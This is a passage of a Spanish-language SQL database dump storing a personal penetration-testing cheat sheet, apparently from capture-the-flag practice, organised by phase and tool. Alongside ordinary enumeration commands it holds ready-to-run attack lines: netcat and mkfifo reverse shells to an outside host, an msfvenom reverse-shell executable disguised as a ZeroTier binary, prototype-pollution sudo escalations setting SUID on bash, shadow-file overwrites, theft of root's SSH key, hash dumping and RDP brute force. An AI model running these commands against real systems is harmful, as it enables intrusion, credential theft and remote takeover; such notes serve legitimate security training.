(86, 'phobex, cve-2024-25415 51957', '#1 (ALL : ALL) NOPASSWD: /usr/local/bin/obex\r\n#2 cd /tmp\r\n#3 sudo /usr/local/bin/obex &#039;{&amp;quot;__proto__&amp;quot;:{&amp;quot;authenticated&amp;quot;:true,&amp;quot;command&amp;quot;:&amp;quot;chmod +s /bin/bash&amp;quot;}}&#039;\r\n#4 /bin/bash -p', 'Escalar privilegio a partirt de binario obex', 'Observamnos el contenido\r\ncat /usr/local/bin/obex\r\n#! /usr/bin/env node\r\nvar args = process.argv.slice(2);\r\nconst { exec } = require(&#039;child_process&#039;);\r\n\r\n(async () =&amp;gt; {\r\n  const lib = await import(&#039;@almela/obx&#039;);\r\n  var USER_JSON = JSON.parse(args[0]);\r\n  var user={\r\n    &#039;username&#039;: &amp;quot;root&amp;quot;\r\n  };\r\n  try {\r\n    lib.add (user, USER_JSON)\r\n  } catch (e) { }\r\n  var newUser={}\r\n  if(newUser.authenticated==true)\r\n  {\r\n    exec(newUser.command);\r\n  }\r\n})();\r\n', '', 1, 4, 10),
(87, 'poverrider 51387', 'http://0.0.0.0/files/attach/attachment_3shell.phar?cmd=nc -e /bin/bash 1.1.1.1 1234', 'Explotacion de poverrrider con credenciales', '#proverrider\r\nProbamos contrase&amp;ntilde;as por defecto (admin:admin)\r\nBuscando en Google encontramos un exploit RCE (51387)\r\nEn el apartado Admin subimos una webshell .phar en lugar de una foto', '', 1, 2, 10),
(88, 'poverrider user.is_admin==true exec(user.cmd) proto', '#1 (ALL : ALL) NOPASSWD: /usr/local/bin/overrider\r\n#2 sudo /usr/local/bin/overrider &#039;{&amp;quot;__proto__&amp;quot;:{&amp;quot;is_admin&amp;quot;:true, &amp;quot;cmd&amp;quot;:&amp;quot;chmod +s /bin/bash&amp;quot;}}&#039;', 'Escalada de privilegios con binario overrider', '#1 identificamos el binario\r\n#2 Contenido\r\n# /usr/bin/env node\r\nvar args = process.argv.slice(2);\r\n(async () =&amp;gt; {\r\n  const lib = await import(&#039;json-override&#039;);\r\n  const { exec } = await import(&#039;child_process&#039;);\r\n  var defaults = JSON.parse(args[0]);\r\n  var user = {}\r\ntry {\r\n  lib.default ({}, defaults)\r\n} catch (e) { }\r\n  if(user.is_admin==true)\r\n  {\r\n    exec(user.cmd);\r\n  }\r\n})();\r\n\r\n#2 Escalamos privilegios\r\n\r\nFuente:\r\nhttps://security.snyk.io/vuln/SNYK-JS-JSONOVERRIDE-7575312\r\n', '', 1, 4, 10),
(89, '(ALL : ALL) NOPASSWD: /usr/local/bin/confuser, env_reset, mail_badpass, PATH', '#1 sudo -l\r\n#2 strings /usr/local/bin/confuser\r\n#3 cd /tmp\r\n#4 echo &amp;quot;cp /bin/bash /tmp/bash &amp;amp;&amp;amp; chmod +s /tmp/bash&amp;quot; &amp;gt; /tmp/getpcaps\r\n#5 chmod +x /tmp/getpcaps\r\n#6 export PATH=/tmp:$PATH\r\n#7 bash -p', 'Escalaci&amp;oacute;n de privilegio con binario agregado a la variable de entrono &amp;amp;PATH', '1# listamos los archivos que puedan ser ejecutados como root\r\nMatching Defaults entries for www-data on confuser:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nUser www-data may run the following commands on confuser:\r\n    (ALL : ALL) NOPASSWD: /usr/local/bin/confuser\r\nwww-data@confuser:/var/www/html/plugins/source/source$\r\n\r\n2# Listamos los strings del binario (Observamos esta cadena, donde se indica un binario con ruta absoluta y el segundo no)\r\nDe esta manera podemos crear un archivo con este nombre y lo agregaremos a la variable de entorno PATH\r\n\r\n/bin/ls -alR &amp;amp;&amp;amp; getpcaps\r\n\r\n#3 Nos dirigimos a la carpeta tmp\r\n#4 creamos nuestro archivo\r\n#5 Proporcionamos el permiso para ejecucion\r\n#6 agregamos la ruta a la variable de entorno $PATH\r\n#7 Ejecutamos el bash\r\n\r\n', '', 1, 4, 10),
(90, 'Responsive FileManager, CVE-2022-44276-PoC, strip_tags, confuser', '#1 Responsive FileManager\r\n#2 https://github.com/HerrLeStrate/CVE-2022-44276-PoC\r\n#3 strip_tags\r\n#4 shell.php&amp;lt;.txt\r\n\r\n', 'Explotacion de funcion strip_tags al cargar un archivo', '#1 identificamos la tecnologia\r\n#2 buscamos un exploit o POC\r\n#3 Encontramos que esta funcion contiene una vulnerabilidad\r\n#Donde al nombrar un archivo (shell.php&amp;lt;.txt)  nos elimina un etiqueta ocasionando que el nombre al ser guardado cambie de extencion (txt y php son guardados)\r\nDe esta manera podemos obtener una webshell\r\n', '', 1, 2, 10),
(91, 'buscar', '#1 ls /root\r\n#2 cat /proc/1/environ\r\n#3 env', 'Comandos para buscar en linux', '', '', 1, 1, 10),
(92, 'buscar', '\r\n#1 ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2&amp;gt; /dev/null', 'Buscar claves privadas', '', '', 1, 1, 10),
(93, 'resource rsa', 'https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/', 'Explotar claves rsa', 'a', '', 1, 1, 10),
(94, 'templater, admilost, (ALL : ALL) NOPASSWD: /usr/local/bin/templater ansible playbooks', '#1 Creamos un archivo .yml\r\n#2 lo subimos a la maquina victima\r\n#3 sudo /usr/local/bin/templater /tmp/clave.yml', 'Obtencion de clave SSH privada mediante vulnerabilidad en ansible', '#esta vulnerabilidad se aprovecha por la tegnologia de asimble pasando por parametro una plantilla .yml\r\n#1 codigo del archivo yml\r\n - hosts: localhost\r\n  tasks:\r\n   -name: Leer la clave ssh de root\r\n	command: &amp;quot;cat /root/.ssh/id_rsa&amp;quot;\r\n	register: output\r\n		\r\n   -debug:\r\n	 var: output.stdout\r\n\r\n#2 puede utilizar un servidor de python y wget\r\n#3 Ejecutamos para obtener la clave privada\r\n\r\nBuscar en google: &amp;quot;ansible privilege escalation&amp;quot;', '', 1, 4, 10),
(95, 'shadow, mkpasswd', '#1 mkpasswd --method=sha-512 &amp;quot;Passw0rd&amp;quot;\r\n#2 echo &#039;root:$6$AGOVzn616grxazLk$HXLRH1r6mtutnVbQv5dSCo7l1qtEG.wAsiNPIUCUOVwoxN6ryrbVVAyG9dU3MsIajqQRjF9FhLym9zqYgc7lE.:19850:0:99999:7:::&#039;', 'Reescribir constrase&amp;ntilde;a en shadow', '#1 se genera una clasve con formato de claves de acceso de sistemas linux\r\n#2 reescribimos el archivo shadow', '', 1, 2, 10),
(96, 'nmap, tcp, puertos, reconocimiento', '#1 nmap -sS 10.0.160.243 -Pn -sV -v -p-\r\n#2 sudo nmap -p- 10.0.160.243 -Pn -n -v\r\n#3 nmap -sV --script=http-enum 0.0.0.0', 'Reconocimiento de puertos', '#1 los puertos mas comunes TCP\r\n#2 Todos los puertos\r\n#3 enumerar servicios', '', 1, 1, 1),
(97, 'ftp, anonymous, 21', '#0 find / -type f -name ftp* 2&amp;gt;/dev/null | grep scripts\r\n#1 ftp -p 10.129.42.253\r\n#2 openssl s_client -connect 0.0.0.0:21 -starttls ftp\r\n#3 nc -nv 10.129.14.136 21\r\n\r\n#4 wget -m --no-passive ftp://anonymous:anonymous@0.0.0.0', 'Conexion anonima de FTP', '#0 Busca scrips para ftp en nmap\r\n#1 Conexion anonima de ftp\r\nuser: anonymous\r\npass: anoymous o en blanco\r\n\r\n#3 conxion ftp por ssl\r\n\r\n#4 descargar todos los archivos disponibles\r\n\r\nComandos:\r\n\r\ndebug, status, ls, ls -r, cd, get, , touch, put, exit\r\n\r\n#Archivo de configuracion\r\ncat /etc/vsftpd.conf\r\n\r\n#arcghivos de usuarios\r\ncat /etc/ftpusers', '', 1, 1, 10),
(98, ' snmpwalk, snmp', '#1 snmpwalk -v 2c -c public 0.0.0.0 1.3.6.1.2.1.1.5.0\r\n#2 snmpwalk -v 2c -c private  0.0.0.0\r\n#3 onesixtyone -c dict.txt 0.0.0.0', 'Enumeracion SNMP', '#3 enumeracion con diccionario', '', 1, 1, 10),
(101, 'grep, strings, endianness', '#1 grep &#039;/tcp&#039; scan.txt | grep &#039;open&#039; | cut -d &#039;/&#039; -f1 | paste -sd,\r\n#2 strings -el archivo | grep &amp;quot;palabra&amp;quot;', 'Uso destrings y grep', '#1 En un resultado de nmap unicamente nos deja los puertos separados por coma\r\n#2 Busqueda considerando endianness', '', 5, 11, 10),
(102, 'sqlserver impacket', '#1 impacket-mssqlclient &#039;dominio.encontrado/usuario:password&#039;@0.0.0.0\r\n#2 SELECT * FROM fn_my_permissions(NULL, &#039;SERVER&#039;);\r\n#3 SELECT name FROM master..sysdatabases\r\n   SELECT TABLE_NAME FROM information_schema.tables\r\nEscalada de privilegio\r\n#4\r\nEXEC sp_configure &#039;show advanced options&#039;, 1;\r\nRECONFIGURE;\r\nEXEC sp_configure &#039;xp_cmdshell&#039;, 1;\r\nRECONFIGURE; \r\n#5 EXEC xp_cmdshell &#039;whoami&#039;;', 'Conexion remota a sqlserver', '#1 conexion a sqlserver cuando se identifique\r\n#2 Ver los permisos que tiene sqlserver\r\n#3 Listar bases de datos\r\n#4 Activamos para poder ejecutar una shel en caso de que nos permita\r\n#5 Ejecucion de comandos\r\n', '', 1, 2, 10),
(103, 'SharpHound, winPEAS, bloodhound, windows', '#1 upload nombreArchivo\r\n#2 ./nombreArchivo -c all nombreArchivoSalida.zip\r\n#3 download nombreArchivoGenrado.zip', 'Enumeracion de windows para escalar privilegios, SharpHound, winPEAS', '#1 cargamos el archivo\r\n#2 Ejecutamos el archivo (SharpHound)\r\n#3 Descargamos el resultado\r\n\r\n-Los resultados se pueden analizar con bloodhound\r\n\r\n\r\nFuente:\r\nhttps://github.com/SpecterOps/SharpHound/releases\r\nhttps://github.com/peass-ng/PEASS-ng/tree/master/winPEAS', '', 1, 4, 9),
(104, 'broccoli-compass, cabbage', '#1 sudo /usr/local/bin/cabbage  var user_provided_filename = &#039;$(cat /etc/shadow &amp;gt; ./flag.txt;);&#039;;', 'Escalar privilegios con vulnerabilidad en &amp;quot;broccoli-compass&amp;quot;', '#1 Esta vulnerabilidad nos permite ejecutar comandos como root', '', 1, 4, 10),
(105, 'Black Cat CMS 1.4, ', '#1 Cargar una webshell comprimida (.zip) en admintool &amp;gt; plugins\r\n#2 http://dominio.com/modules/lib_jquery/plugins/shell/shell.php', 'Explotacion de Black Cat CMS 1.4', '#1 \r\n#2 Al cargar un archivo .zip se genera un recurso con nobre del archivo en donde se almacena el archivo descomprimido\r\n\r\n\r\nExplit: https://www.exploit-db.com/exploits/51605', '', 1, 2, 32),
(106, 'python venv entorno', '#1 python - m venv venv \r\n#2 source venv/bin/activate', 'Creacion de un entorno de trabajo para instalar un paquete de python', '#1 Creacion de un entorno de trabajo\r\n#2 Activacion del entorno de trabajo', '', 5, 10, 25),
(107, 'VMware, cursor, vmx', 'keyboard.allowBothIRQs = &amp;quot;FALSE&amp;quot;\r\nkeyboard.vusb.enable = &amp;quot;TRUE&amp;quot;', 'Arreglar bug donde el cursor se retrasa en una maquina virtual (VMware)', '#Agregar estos valores al archivo nombreMaquina.vmx (con la maquina apagada)', '', 5, 10, 25),
(108, 'shodan', '#1 http.html:dominio.org', 'Filtros de shodan', '#1 B&amp;uacute;squeda de IPs en los archivos html de un domino', '', 1, 1, 35),
(109, 'count, cuentas usuario windows power, roles', '#1 Get-LocalGroupMember -Group &amp;quot;Administradores&amp;quot;', 'Obtener cuentas con privilegios de Administrador', '#Obtener cuentas con privilegios de Administrador', '', 4, 13, 36),
(110, 'windows primera conexion IP power', '#1 HKEY_LOCAL_MACHINE &amp;gt; SOFTWARE &amp;gt; Microsoft &amp;gt; Windows &amp;gt; CurrentVersion &amp;gt; Run', 'Obtener la primera ip a la que se conect&amp;oacute; un equipo de windows', '#1 //Obnener la primera IP a la que se conect&amp;oacute;', '', 4, 13, 36),
(111, 'windows server ruta carpeta publica web', 'C:xyzinetpubxyzwwwroot', 'Ruta de la carpeta publica  (web) en windows server', '#1 Ruta donde se guardan los archivos p&amp;uacute;blicos de windows server (web)', '', 4, 13, 9),
(112, 'systeminfo informacion windows', '#1 systeminfo', 'Obtener informacion de un sistema windows', '#1 obtiene informacion del sistema windows', '', 4, 13, 37),
(113, 'tareas task', '#1 schtasks /query /fo LIST /v', 'Listar tareas ejecutandose en windows', '#1 Listado de tareas en windows', '', 4, 13, 37),
(114, 'user usuario windows', '#1 net user\r\n#1 net user usuario', 'Informacion de usuarios en windows', '#1 listamos usuarios en windows\r\n#2 Obtener informacion de un usuario de windows', '', 4, 13, 37),
(115, 'zip, PK', '#1 zip2john archivo_con_contrase&amp;ntilde;a.zip &amp;gt; hash_de_salida.txt\r\n#2 john hash_de_salida.txt \r\n', 'Obtener contrase&amp;ntilde;a de un archivo .zip (PK)', '#1 Obtenemos el hash de un archivo .zip con contrase&amp;ntilde;a\r\n#2 deciframos el hash\r\n\r\nNota: Los archivos .zip deben iniciar con PK\r\n', '', 2, 22, 10),
(116, 'directorios, goubuster', '#1 gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Discovery/Web-Content/common.txt', 'Enumeracion de directorios', '', '', 1, 1, 34),
(117, 'volatility, memoria ram', '#1 vol.py -f linux.mem --profile perfilIdentificado(Eje. Win7SP1x64)\r\n#2 vol.py -f linux.mem --profile perfil pslist\r\n#3 vol.py -f linux.mem --profile perfil netscan\r\n#4 vol.py -f linux.mem --profile perfil dlllist | grep &amp;quot;algo&amp;quot;\r\n#5 vol.py -f linux.mem --profile perfil procdump -D carpetaDestino/ -p idDeProcesoaDumpear\r\n#6 vol.py -f linux.mem --profile perfil hashdump -D sam.txt (john sam.txt)\r\n#7 vol.py -f linux.mem --profile perfil vadinfo | grep &amp;quot;nodo(eje. 0xfffffa800577ba10)&amp;quot; -B10 -A 10\r\n#8 vol.py -f linux.mem --profile perfil shimcache | grep &amp;quot;fechaEspecifica&amp;quot;\r\n#9 vol.py -f linux.mem --profile perfil cmdline | grep &amp;quot;.extencion&amp;quot;\r\n#10vol.py -f linux.mem --profile Win7SP1x64 memdump -p pid(Eje. 3032) -D carpetDestino/\r\n#11vol.py -f linux.mem --profile Win7SP1x64 mftparser | grep &amp;quot;idRegistro&amp;quot; -B 10 -A 10', 'Analisis del volcado de memoria ram (Volatility)', '#1 obtenemos el perfil del equipo del que fue extraido el volcado de memoria\r\n#2 Obtener un listado de los procesos ejecutados\r\n#3 Obtener informaci&amp;oacute;n de las conexiones de red\r\n#4 Obtener un listado de Dlls\r\n#5 Extraer un proceso\r\n#6 Extraer los hash de los usuarios (SAM)\r\n#7 Ver la protecci&amp;oacute;n de memoria de un nodo\r\n#8 Buscar el proceso o aplicacion ejecutado en una fecha especifica\r\n#9 Extraer un procedo mediante un PID\r\n#10Buscar lo que esta escrito en notepad cuando se dumpeo la memoria (extraer un proceso)\r\n#11 Buscar un archivo dentro de un registro\r\n\r\nNota: -B 10 y -A 10 son para acotar los resultados que se muestran', '', 4, 18, 38),
(118, 'base64', '#1 echo &amp;quot;dceece590f3284c3866305eb2473d099&amp;quot; | base64 &amp;gt;  archivoSalida\r\n#2 echo &amp;quot;ZGNlZWNlNTkwZjMyODRjMzg2NjMwNWViMjQ3M2QwOTkK&amp;quot; | base64 -d &amp;gt; archivoSalida\r\n#3  base64 archivo -w 0', 'Codifica en base64 un el contenido de un archivo y lo muestra en pantalla', '#1 codificar base64 y la salida se almacena en un archivo\r\n#2 decodificar base64 y la salida se almacena en un archivo\r\n#3 codifica y muestra en pantall', '', 6, 25, 10),
(119, 'shell', '#1 echo &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 1.1.1.1 9002 &amp;gt;/tmp/f&#039; | tee -a archivoPermitido.sh\r\n#2 sudo /home/nibbler/personal/stuff/archivopermitido.sh', 'Agregar una shell a un archivo que se ejecuta como root', '#1 agregamos la shell a un archivo que se ejecuta como root\r\n#2 ejecutamos el archivo (previamente se pone a la escucha un puerto)', '', 1, 7, 10),
(120, 'sam.bak system samdump2, hashcat NTLM', '#1 samdump2 -o hashes.txt system.bak sam.bak\r\n#2 hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show\r\n', 'Descifrado de contrase&amp;ntilde;a de windows (sam y system)', '#1 obtenemos los usuarios y hash\r\n#2 Mediante un ataque de diccionario obtener la contrase&amp;ntilde;a (kali)\r\n\r\n\r\nNota: la ruta de los archivos:\r\nc:xyzwindowsxyzsystem32xyzconfigxyz\r\n\r\nSource:\r\nhttps://github.com/c3r0d4y/sam.git', '', 6, 26, 39),
(121, 'GetSimple CMS v3.3.16 php, ALL : ALL) NOPASSWD:', '#1 python3 51475.py 0.0.0.0 / 1.1.1.1:1234 admin\r\n#2 sudo /usr/bin/php -r &amp;quot;system(&#039;cat /root/user.txt&#039;);&amp;quot;', 'Acceso inicial y escalacion de privilegio GetSimple v3.3.16', '#1 acceso inicial con el exploit 51475.py (), al cual se le cambio la libreria &amp;quot;telnetlib&amp;quot; por &amp;quot;telnetlib3&amp;quot;\r\n#2 Escalacion de privilegio aprovechando el binario php\r\n\r\n(ALL : ALL) NOPASSWD: /usr/bin/php', '', 1, 4, 32),
(122, 'host nmap', '#1 sudo nmap 0.0.0.0/24 -sn -oA tnet | grep for | cut -d&amp;quot; &amp;quot; -f5\r\n#2 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d&amp;quot; &amp;quot; -f5\r\n#3 sudo nmap 0.0.0.0 -sn -oA host -PE --packet-trace --disable-arp-ping\r\n', 'Escaneo de hosts', '#1 reconocimiento de hosts (solo si la configuracion del firewall lo permite)\r\n#2 a partir de una lista de host proporcionada\r\n#3 desactivamos arp y con el valor de tls podemos saber el sistema operativo\r\n\r\n\r\n', '', 1, 1, 1),
(123, 'curl subdominios', '#1 curl -s https://crt.sh/xyz?qxyz=dominio.orgxyz&amp;amp;outputxyz=json | jq . | grep name | cut -d&amp;quot;:&amp;quot; -f2 | grep -v &amp;quot;CN=&amp;quot; | cut -d&#039;&amp;quot;&#039; -f2 | awk &#039;{gsub(/xyzxyzn/,&amp;quot;xyzn&amp;quot;);}1;&#039; | sort -u', 'B&amp;uacute;squeda de sub-dominios', '#1 b&amp;uacute;squeda de sub-dominios', '', 1, 1, 15),
(124, 'dns dig 53 CH bind', '#1 dig any dominio.org\r\n#2 dig ns dominio.org @0.0.0.0\r\n#3 dig CH TXT version.bind 0.0.0.0\r\n#14 dig axfr dominio.org', 'Enumeraci&amp;oacute;n de DNS con dig', '#1 Consultar todos los registros DNS\r\n#3 consultar version del servidor\r\n#4 Extraer la zona de transferencia\r\n\r\nRuta en linux: \r\ncat /etc/bind/named.conf.local\r\ncat /etc/bind/db.domain.com\r\ncat /etc/bind/db.0.0.0.0', '', 1, 1, 40),
(125, 'TFTP', 'TFTP', 'Enumeracion TFTP', '#comandos\r\nconnect\r\nget\r\nput\r\nquit\r\nstatus\r\nverbose', '', 1, 1, 10),
(126, 'smbclient, samba, 445,139', '#1 smbclient -N -L xyzxyz0.0.0.0\r\n#2 smbclient xyzxyzxyzxyz0.0.0.0xyzxyzrecurso1\r\n#3 smbclient -L xyzxyz0.0.0.0xyz -U usuario\r\n#4 smbclient xyzxyz0.0.0.0xyzrecurso -U usuario', 'Enumeracion SMB (smbclient)', '#1 listamos los recursos compartidos (-N sin necesidad de tener runa sessi&amp;oacute;n activa)\r\n#2 Conexi&amp;oacute;n a  aun recurso\r\n#3 Listamos recursos de un usuario encontrado (cuando no se cuenta con usuario poner -N y quitar -U)\r\n\r\n\r\nsmbstatus\r\n', '', 1, 1, 42),
(127, 'rcpclient, smb, 445,139', '#1 rpcclient -U &amp;quot;&amp;quot; 0.0.0.0\r\n#2 for i in $(seq 500 1100);do rpcclient -N -U &amp;quot;&amp;quot; 0.0.0.0 -c &amp;quot;queryuser 0x$(printf &#039;%xxyzn&#039; $i)&amp;quot; | grep &amp;quot;User Namexyz|user_ridxyz|group_rid&amp;quot; &amp;amp;&amp;amp; echo &amp;quot;&amp;quot;;done', 'Enumeracion de smb (rcpclient)', '#1 conexi&amp;oacute;n sin autenticaci&amp;oacute;n\r\n#2 fuerza bruta para obtener el rid de usuario', '', 1, 1, 41),
(128, 'kerbrute, 139, 445, smb, samba', '#1 ./kerbrute_linux_amd64 userenum -d dominio.victima --dc 0.0.0.0 diccionario-users-active.txt', 'Enumeracion de usuarios SMB mediante ataque de diccionario (kerbrute).', '#1 Enumeration de usuarios mediante un diccionario', '', 1, 1, 43),
(129, '445, 139 smb, samba', '#1 enum4linux 0.0.0.0', 'Enumeracion de smb (enum4linux)', '#1 Enumeraci&amp;oacute;n de SMB (con -p especificamos puertos si es necesario)', '', 1, 1, 44),
(130, 'impacket, 139, 445, smb, samba, rdp, 3389', '#0 impacket-lookupsid anonymous@0.0.0.0\r\n#1 impacket-GetNPUsers dominio.org/ -dc-ip 0.0.0.0 -usersfile usuarios_victima.txt -request\r\n#2 impacket-GetUserSPNs -dc-ip 0.0.0.0 -request dominio.org/usuario\r\n#3 impacket-secretsdump dominio.local/usuario:password@0.0.0.0', 'Enumeracion de contrase&amp;ntilde;as o hashes en SMB (impacket)', '#0 enumeracion de usuarios\r\n#1 Una vez que se encuentran usuarios intentamos enumerar contrase&amp;ntilde;as o hashes\r\n#2 Extraer ticket o hash, se debe tener un usuario valido\r\n#3 Se puede intentar la conexion con usuario y contrase&amp;ntilde;a', '', 1, 2, 10),
(131, '139, 445, smb, samba, hashcat, john', '#1 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt\r\n#2 john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt', 'Descifrar hash smb (hashcat)', '#1 descifrar hash (se pone el hash completyo, como si fuera rsa)', '', 1, 2, 39),
(132, '139, 445, smb, samba, evil', '#1 evil-winrm -i 0.0.0.0 -u usuario-econtrado\r\n#2 evil-winrm -i 0.0.0.0 -u usuario -H hash-localizado(0e0363213e37b94221497260b0bcb4fc)', 'Coneci&amp;oacute;n con usuario localizado (evil-winrm)', '#1 Intentamos conectarnos con los usuarios localizados\r\n#2 si el hash es ntlm se puede intentar una conexion con el hash', '', 1, 1, 45),
(133, '139, 445, smb, samba,  xfreerdp3', '#1 xfreerdp3 /v:0.0.0.0 /u:usuario', 'Conexion por rdp (xfreerdp3)', '#1 Tambien podemos intentar una conexion por rdp a windows', '', 1, 1, 46),
(134, 'nfs, 111, 2029, nmap', '#1 sudo nmap 0.0.0.0 -p111,2049 -sV -sC\r\n#2 sudo nmap --script nfs* 0.0.0.0 -sV -p111,2049\r\n#3 showmount -e 0.0.0.0\r\n#4 mkdir target-NFS\r\n#4 sudo mount -t nfs 1.1.1.1:/ ./target-NFS/ -o nolock\r\n#4 cd target-NFS\r\n#4 tree .\r\n#5 ls -l mnt/nfs/\r\n#5 ls -n mnt/nfs/', 'Enumeracion NFS (nmap)', '#1 enumeraci&amp;oacute;n nfts\r\n#2 enumeraci&amp;oacute;n\r\n#3 mostrar recursos disponibles\r\n#4 montaje de un recurso disponible\r\n#5 listamos el conbtenido de un recurso', '', 1, 1, 1),
(135, 'awk, sort, grep cut', '#1 | cut -d&amp;quot;[&amp;quot; -f1 \r\n#2 | awk &#039;{print $(5)}&#039;\r\n#3 | uniq -c \r\n#4 | sort -nr ', 'Filtrado de logs (awk, grep, cut, uniq, sort)', '#1 todo lo que esta despues de [\r\n#2 solo la columna 5\r\n#3 no repite valores y muestra cantida\r\n#4 organiza en forma descendente', '', 4, 19, 10),
(136, 'rdp, nxc NetExec, 3389', '#1 nxc rdp 0.0.0.0 -u usuario -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding', 'Ataque de fuerza bruta a RDP (nxc)', '', '', 1, 2, 47),
(137, 'msfvenom, shell, zerotier, windows', '#1 msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=8888 -f exe -o ZeroTier.exe\r\n#2 C:xyzProgram Files (x86)xyzZero TierxyzZero Tier One\r\n#3 certutil -urlcache -split -f &amp;quot;http://1.1.1.1:8000/ZeroTier.exe\r\n#4 sc.exe start zerotieroneservice \r\n#4 net start zerotieroneservice', 'Escalacion de privilegio (windows)', '#1 creamos una rever shell en exe\r\n#2 no dirigimos a la ruta del archivo vulnerable\r\n#3 copiamos el payload .exe generado\r\n#4 reiniciamos el servicio vulnerable, previo se pone un puerto a la escucha', '', 1, 4, 9),
(138, 'dns 53', 'for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v &#039;;xyz|SOA&#039; | sed -r &#039;/^xyzs*$/d&#039; | grep $sub | tee -a subdomains.txt;done', 'Ataque de fuerza bruta para obtener subdominios', '', '', 1, 1, 10),
(139, 'dnsenum', 'dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb', 'Enumeracion de subdominios DNS', '', '', 1, 1, 48);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `fases`
--

CREATE TABLE `fases` (
  `id_fase` int(11) NOT NULL,
  `fase` varchar(100) NOT NULL,
  `orden` int(11) NOT NULL,
  `id_area` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `fases`
--

INSERT INTO `fases` (`id_fase`, `fase`, `orden`, `id_area`) VALUES
(1, 'Reconocimiento', 1, 1),
(2, 'Explotacion', 2, 1),
(4, 'Escalacion de privilegios', 4, 1),
(7, 'Post-explotación', 3, 1),
(9, 'Avace lateral', 5, 1),
(10, 'Configuraciones', 0, 5),
(11, 'Programación', 0, 5),
(12, 'Trafico de red', 1, 4),
(13, 'Windows', 2, 4),
(14, 'Binarios', 1, 2),
(15, 'Exe', 2, 2),
(16, 'Excel', 3, 2),
(17, 'APK', 4, 2),
(18, 'Ram', 4, 4),
(19, 'Logs', 5, 4),
(20, 'Redes sociales', 1, 3),
(21, 'Darweb', 2, 3),
(22, 'ZIP', 7, 2),
(23, 'Simetrica', 0, 6),
(24, 'Asimetrica', 1, 6),
(25, 'Codificación', 2, 6),
(26, 'Ataque', 4, 6);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `herramientas`
--

CREATE TABLE `herramientas` (
  `id_herramienta` int(11) NOT NULL,
  `nombre` varchar(100) NOT NULL,
  `notas` varchar(10000) NOT NULL,
  `archivo` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `herramientas`
--

INSERT INTO `herramientas` (`id_herramienta`, `nombre`, `notas`, `archivo`) VALUES
(1, 'Nmap', '#1 -sn desactiva escaneo de puertos\r\n#2 -PE Escaneo mediante socicitudes de eco ICMP\r\n#3 --packet-tr', NULL),
(2, 'SQLMap', '', ''),
(3, 'Metasploit', 'sn', NULL),
(4, 'Netcat', '', NULL),
(9, 'Comandos Windows', '', NULL),
(10, 'Comandos Linux', '', ''),
(11, 'Hydra', '', NULL),
(12, 'testssl', '', NULL),
(13, 'theHarvester', '', NULL),
(14, 'cewl', '', ''),
(15, 'curl', '', NULL),
(25, 'Tips', '', NULL),
(26, 'Python', '', NULL),
(27, 'PHP', '', NULL),
(28, 'sqlite', '', NULL),
(29, 'dnsmasq', '', NULL),
(30, 'html', '', NULL),
(31, 'john', '', NULL),
(32, 'exploits', '', NULL),
(33, 'dnsrecon', '', NULL),
(34, 'gobuster', '', NULL),
(35, 'SHODAN', '', NULL),
(36, 'Power Shell', '', NULL),
(37, 'CMD', '', ''),
(38, 'Volatility', '', NULL),
(39, 'hashcat', '', NULL),
(40, 'dig', '', ''),
(41, 'rcpclient', 'srvinfo	        Informaci&amp;oacute;n del servidor.\r\nenumdomains	Enumerar todos los dominios que es\r\nquerydominfo\r\nnetshareenum\r\nnetsharegetinfo carpetaCompartida\r\ndsenumdomtrusts  Enumera dominios', NULL),
(42, 'smbclient', '', NULL),
(43, 'kerbrute', '', NULL),
(44, 'enum4linux', '', NULL),
(45, 'evil-winrm', '', NULL),
(46, ' xfreerdp3', '', ''),
(47, 'NetExec', '', NULL),
(48, 'dnsenum', '', NULL),
(49, 'rtwttr', '', NULL);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `areas`
--
ALTER TABLE `areas`
  ADD PRIMARY KEY (`id_area`);

--
-- Indices de la tabla `comandos`
--
ALTER TABLE `comandos`
  ADD PRIMARY KEY (`id_comando`),
  ADD KEY `id_area` (`id_area`,`id_fase`,`id_herramienta`),
  ADD KEY `id_fase` (`id_fase`),
  ADD KEY `id_herramienta` (`id_herramienta`);

--
-- Indices de la tabla `fases`
--
ALTER TABLE `fases`
  ADD PRIMARY KEY (`id_fase`),
  ADD KEY `id_area` (`id_area`);

--
-- Indices de la tabla `herramientas`
--
ALTER TABLE `herramientas`
  ADD PRIMARY KEY (`id_herramienta`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `areas`
--
ALTER TABLE `areas`
  MODIFY `id_area` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT de la tabla `comandos`
--
ALTER TABLE `comandos`
  MODIFY `id_comando` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=142;

--
-- AUTO_INCREMENT de la tabla `fases`
--
ALTER TABLE `fases`
  MODIFY `id_fase` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT de la tabla `herramientas`
--
ALTER TABLE `herramientas`
